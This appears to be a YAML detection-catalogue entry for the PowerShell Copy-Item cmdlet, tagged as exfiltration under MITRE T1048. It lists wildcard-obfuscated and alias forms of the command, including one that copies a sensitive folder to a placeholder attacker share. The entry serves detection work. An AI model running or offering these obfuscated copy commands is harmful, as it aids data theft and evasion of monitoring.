---
Name: Copy-Item
Description: "Copy files and directories. Used for staging payloads, copying sensitive data for exfiltration, or lateral file movement."
Platform: powershell
BinaryPath:
  - "PowerShell cmdlet"
Category: exfiltration
MitreID: T1048
Patterns:
  - Pattern: "& (gcm C*-I*m) -Path C:\\sensitive -Destination \\\\attacker\\share"
    Wildcards: ["*"]
    Notes: "Wildcards in both verb and noun"
  - Pattern: "& (gcm Copy-It*) -Path ..."
    Wildcards: ["*"]
    Notes: "Star matches 'em'"
  - Pattern: "& (gcm C?py-Item) -Path ..."
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'o'"
  - Pattern: "copy -Path src -Destination dst"
    Wildcards: []
    Notes: "Alias 'copy' for Copy-Item"
  - Pattern: "cp -Path src -Destination dst"
    Wildcards: []
    Notes: "Alias 'cp' for Copy-Item"
  - Pattern: "cpi -Path src -Destination dst"
    Wildcards: []
    Notes: "Alias 'cpi' for Copy-Item"
  - Pattern: "& (gcm *-Item) -Path ..."
    Wildcards: ["*"]
    Notes: "Prefix wildcard — note: matches Get-Item, Set-Item etc."
Resources:
  - https://attack.mitre.org/techniques/T1048/
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/copy-item
---
